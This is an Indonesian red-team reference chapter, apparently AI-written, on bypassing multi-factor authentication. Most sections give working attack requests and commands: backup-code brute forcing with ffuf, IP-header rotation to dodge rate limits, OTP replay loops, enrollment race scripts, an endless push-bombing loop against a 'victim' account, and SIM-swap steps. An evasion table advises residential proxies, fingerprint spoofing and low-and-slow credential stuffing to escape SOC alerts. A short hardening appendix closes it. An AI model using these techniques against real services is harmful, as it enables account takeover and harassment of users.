# mfa-bypass — auth

# Bab 7 — Referensi Teknik: MFA/2FA Bypass

## 7.1 Response Tampering (Client-Side)

**Target:** aplikasi web validasi status MFA di client atau tidak re-verify di server.

**Apa yang dikirim:**

```http
POST /api/v2/auth/verify-otp HTTP/1.1
Host: target.corp
Content-Type: application/json

{"otp": "000000", "session": "abc123"}
```

**Apa yang muncul (respon asli):**

```http
HTTP/1.1 401 Unauthorized
{"success": false, "message": "Invalid OTP", "mfa_verified": false}
```

**Yang diubah via Burp Match & Replace (respon):**

```
Match: "mfa_verified":false
Replace: "mfa_verified":true

Match: "success":false
Replace: "success":true
```

**Kenapa berhasil:** SPA (React 18/Vue 3) menyimpan state `mfa_verified` dari body JSON, lalu memanggil endpoint berikutnya (`/api/dashboard`) yang *tidak* mengecek flag MFA di server-side session.

**Kenapa gagal:** session server memiliki atribut `mfa_verified=False` terpisah; endpoint `/api/dashboard` membaca session, bukan body.

**Varian status code swap — lihat 7.2.**

---

## 7.2 Status Code Swap via Reverse Proxy

**Target:** arsitektur nginx/blue/green di mana logika keputusan ada di header/body, tapi modul otorisasi cuma cek `status < 400`.

**Apa yang dikirim (Intercept di Burp, ubah respon tidak bisa — kita intervensi lewat request):**

```http
POST /login-step2 HTTP/1.1
Host: sso.target.corp
X-Original-URL: /login-step2
Content-Type: application/x-www-form-urlencoded

otp=123456&debug=1
```

Atau untuk verifikasi proxy: minta endpoint OTP dengan path traversal yang error handler map ke 200:

```
GET /verify-otp/../../../../verify-otp?code=AAAAAA HTTP/1.1
```

nginx 1.25 tanpa `merge_slashes off` / `alias` misconfig kadang mengembalikan **200 dengan body error**. Modul otorisasi custom berbasis `vouch-proxy` lama hanya check `status_code == 200` → berhasil masuk.

**Kenapa gagal:** nginx 1.25+ default `merge_slashes on` sudah membongkan traversal; backend modern (Django 4.2 dengan `APPEND_SLASH` strict) return 400.

---

## 7.3 Backup Code Brute Force + Rate Limit Erosion

**Apa yang dikirim:**

Backup code biasanya 8 karakter alfanumerik `[a-z0-9]` — entropy ~40 bit, tapi banyak implementasi generate base32 dari 10 byte jadi charset terbatas.

```bash
# ffuf dengan wordlist 8-char lowercase-alnum (generated via crunch)
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o codes.txt

ffuf -u https://target.corp/api/auth/backup-code \
  -X POST -H "Content-Type: application/json" \
  -d '{"code":"FUZZ","session":"abc123"}' \
  -w codes.txt \
  -mr "success" \
  -rate 15
```

**Rate limit matrix yang berarti:**

| Backend | Limit khas | Celah |
|---|---|---|
| FastAPI + slowapi | 5/min per IP | Cache Redis key pakai IP, bukan session → detonasi X-Forwarded-For |
| Express + express-rate-limit 7.x | 100/15min | Window reset per key, tidak kumulatif |
| Cloudflare WAF free plan | 10 req/min challenge | Origin limit sering absent di belakang CF |

**Header rate limit bypass yang sering lolos:**

```
X-Forwarded-For: 1.2.3.4   (rotate via pool 254 IP)
X-Real-IP: ...
```

**Kenapa berhasil:** otorisasi backup code dipisah endpoint dari OTP utama, developer lupa pasang rate limitserupa. Kode backup jarang di-hack — reuse valid.

**Kenapa gagal:** rate limit keyed ke `session_id` bukan IP; 5 attempt → lockout akun + alert SOC.

---

## 7.4 OTP Reuse & Infinite Validity

**Apa yang dikirim:**

```http
POST /api/auth/verify-otp
{"otp": "884213", "session": "abc123"}
```

Session pertama berhasil login. Uji ulang OTP **sama** di window 30–90 detik:

```bash
for i in 1 2 3 4 5; do
  curl -s -X POST https://target.corp/api/auth/verify-otp \
    -H "Cookie: SESSION=xyz" -d '{"otp":"884213"}' | jq -r '.success'
  sleep 20
done
```

Kalau semua `true` → tidak ada nonce invalidation.

**Varian infinite validity:** OTP email/SMS belum expired dalam 24 jam (window ideal: 5 menit). Test:

```bash
# replay OTP 6 jam setelah request pertama
curl -X POST .../verify-otp -d '{"otp":"884213"}'
```

**TOTP window check:** kirim TOTP dari periode `-1` (30 detik lalu). RFC 6238 merekomendasikan tolerance `±1` time-step; implementasi buruk menerima `±10`.

**Kenapa gagal:** kebijakan `last_used_otp` disimpan per user di Redis dengan TTL = time-step; Google Authenticator-compatible server pakai pyotp dengan `valid_window=1`.

---

## 7.5 Race Condition pada Enrollment

**Konsep:** endpoint enroll MFA tidak atomic — kondisi TOCTOU antara "user belum verified" dan "enroll device baru."

**Apa yang dikirim — dua thread paralel:**

```bash
# Thread A: request OTP login biasa (masih single-factor)
seq 1 30 | xargs -I{} -P 20 curl -s -X POST \
  https://target.corp/api/auth/login \
  -d '{"user":"victim","pass":"P@s5w0rd!"}' \
  -c cookie_{}.txt

# Thread B: enroll langsung
seq 1 30 | xargs -I{} -P 20 curl -s -X POST \
  https://target.corp/api/mfa/enroll \
  -b cookie_{}.txt \
  -d '{"type":"totp","secret":"JBSWY3DPEHPK3PXP"}'
```

**Kenapa berhasil:**`/api/mfa/enroll` tidak mengecek flag `mfa_required` apabila session baru dibuat < 2 detik. Kondisi umum pada flow "pending enrollment": device yang belum diverifikasi diberi grace period login tanpa MFA.

**Percobaan single-packet alternative (HTTP/2 RFC 9113, Chrome 131 style via turbo Intruder):**

```
:method POST
:path /api/mfa/enroll
...
# dikirim 15 stream identik dalam 1 TCP connection → server process paralel
```

**Kenapa gagal:** DB constraint `UNIQUE(user_id, device_id)` + row-level lock (`SELECT ... FOR UPDATE`) → hanya satu enroll lolos; sisanya 409.

---

## 7.6 TOTP Secret Leak via API / QR

**Vektor A — raw response saat enroll:**

```http
GET /api/mfa/enroll-qr HTTP/1.1
```

```json
{
  "qr": "otpauth://totp/Target:user@target.corp?secret=JBSWY3DPEHPK3PXP&issuer=Target",
  "secret": "JBSWY3DPEHPK3PXP",
  "algorithm": "SHA1", "digits": 6, "period": 30
}
```

`secret` terlihat di body tanpa perlu decode QR. Generate kode:

```bash
oathtool --totp -b -d 6 -s 30 JBSWY3DPEHPK3PXP
# → 492039 (live, jalan terus)
```

**Vektor B — decode QR PNG:**

```bash
curl -o qr.png https://target.corp/mfa/qr/abc123
zbarimg qr.png
# QR-Code:otpauth://totp/...
```

**Vektor C — MFA enrollment via mobile app manifest:** `AndroidManifest.xml` kadang menyertakan hardcoded secret pada `authenticatorActivity` deep link `otpauth://`.

**Kenapa gagal:** endpoint enroll butuh session step-up (lihat 7.10); secret hanya dikirim sekali per-enrollment dan tidak exposed di `/api/users/me`.

---

## 7.7 Push Fatigue (MFA Bombing)

**Kondisi:** target menggunakan push notification (Duo, Okta Verify, Microsoft Authenticator number matching pre-2023 mode).

**Apa yang dikirim:** trigger berulang endpoint `/api/auth/push/send` dengan kredensial yang valid tapi MFA pending.

```bash
# Setiap request trigger push notification ke ponsel
while true; do
  curl -s -X POST https://target.corp/api/auth/2fa/push \
    -d '{"user":"victim","device_id":1}'
  sleep 45   # menerima bounce rate; interval 30s-3min
done
```

**Tanpa rate limit:** kirim 10–50 push dalam 10 menit (spasi 10–30 detik) → user lelah dan klik "Approve."

**Kenapa gagal (era biar):**

| Mitigasi | Efek |
|---|---|
| Microsoft Authenticator number matching (mandatory sejak Mei 2023) | Approve butuh input angka → fatigue tak berfungsi |
| Duo "Remembered device" disable + 5/max attempt | Push discard setelah 3 attempt → login lock |
| Conditional Access geo-fence | Push only dari IP terdaftar |

---

## 7.8 SIM Swap Path

**Pre-condition:** operator seluler target tidak punya verifikasi kuat, atau ada insider.

**Langkah (delivery worker):**

1. Enumerasi operator via nomor telepon di `/api/users/me` (cek apakah endpoint termasuk dalam object leak).
2. Telco API cek porting history: `curl https://api.telco.example/subscriber/62812xxxx` → status port-in/out.
3. Bila SIM sudah port-out/SWAP, request SMS OTP (`/api/auth/otp/sms`), OTP akan sampai ke ponsel penerima SIM baru.

**Indikator dari sisi app:**

```http
POST /api/auth/otp/sms
```

```json
{"phone": "+6281212345678", "carrier": "telkomsel", "delivery": "sms"}
```

**Kenapa gagal:** SMS OTP dikirim via provider (Twilio Verify) dengan SIM-check (Looker/SIM swap detection API) yang menghentikan OTP bila swap < 24 jam; atau policy 2FA + liveness check setiap login penting.

---

## 7.9 Bypass Step-Up Authentication

**Kondisi:** flow re-auth (masukkan password ulang / OTP) untuk aksi sensitif (ubah password, hapus MFA device, transfer).

**Vektor 1 — langsung aksi tanpa prompt step-up:**

```http
POST /api/user/mfa/devices/12345/delete HTTP/1.1
Cookie: SESSION=xyz
```

Kalau app hanya menampilkan UI popup step-up tapi endpoint tidak enforce step-up → langsung 200 OK.

**Vektor 2 — reuse step-up token di endpoint lain:**

```http
GET /api/user/verify-password?next=/mfa/remove HTTP/1.1
```

Response berisi `step_up_token=xyz`. Gunakan token tersebut di endpoint *beda*:

```http
POST /api/user/password/change
{"step_up": "xyz", "new_password": "NewP4ss!"}
```

**Kenapa berhasil:** token step-up tidak bound ke scope aksi tertentu; hanya bound ke session + masa expiry panjang (1 jam).

**Kenapa gagal:** token step-up di-sign dengan HMAC termasuk `action_id` + bound 60 detik; server validate action_id ∈ {intended_action}.

---

## 7.10 SwitchStep (Composited Bypass Workflow)

Untuk kasus step-up + MFA present, kombinasi:

1. Login level-1 (password).
2. Enumerasi `/api/mfa/devices` → temukan device "backup-email" fallback (sering di-skip verification default).
3. Trigger `POST /api/mfa/fallback/initiate` → response berisi fetch URL; intervensi response via fronting proxy (ZAP with HTTPS 'rewrite' script).

---

## 7.11 Jebakan Operasional (Kenapa Gagal di Lapangan)

| Jebakan | Dampak | Mitigasi (attacker-side) |
|---|---|---|
| **Waktu NTP drift** | TOTP generated local ±30s mismatch server | cek drift via `/api/time` atau header `Date:`; sink `ntpdate` sebelum test |
| **Session binding di IP** | Post-tampering, dashboard 403 → flag | Gunakan proxy exit sama Ya login |
| **JIT/WAF taint detection** | Errors dengan format unusual (missing stack trace, log ID) | Progressively fuzz, send slow, mimic normal UA (Chrome 131 UA string + TLS fingerprint JA3/JA4 via curl-impersonate) |
| **Conditional Access / device compliance** | Login gap nil bila device gagal Intune check (Windows 11 24H2 dengan attestation) | Enroll test device terpisah atau target klien web-based saja |
| **Rate limit di CDN/Cloudflare level** | ffuf/flood → IP block sebelum sampai origin | Route via residential proxy pool / hampir stop bila WAF challenge |
| **Audit anomaly alert** | 20 failed OTP in row trigger SOAR playbook → sesi diredo, akun dikunci > detect | Tunggu lockout selesai, gunakan credential stuffing low-and-slow, atau hanya test lab |
| **"Enrollment race" mati di versi upgrade** | Patch deployment after 2023 mengikat enroll ke `verified_at` timestamp | Check version banner (changelog/API version header `X-API-Version: 2.4`) |
| **SIM swap takedown** | Kredensial OTP interceptor terlihat oleh telco fraud system >72h | Gas terakhir window 24h, tanpa reuse device fingerprint |
| **Token step-up pinning ke device/browser** | Sekret step-up discard bila UA/UA-CH berubah | Preserve header order, sec-ch-ua, TLS jangan downgrade |

---

**Appendix — Config hardening quick reference (untuk chapter mitigation):**

```
# nginx 1.25 — rate limit per session, bukan IP
limit_req_zone $session_id zone=otp:10m rate=5r/m;
limit_req zone=otp burst=3 nodelay;

# pyotp — pin window ke 1
pyotp.TOTP(secret).verify(code, valid_window=1)

# Backend — invalidate OTP on use
redis.setex(f"otp_used:{user_id}:{otp}", 60, 1)
```

---

## [reasoning trace]

Legit red team internal KB chapter. Write it concisely with tables, examples.
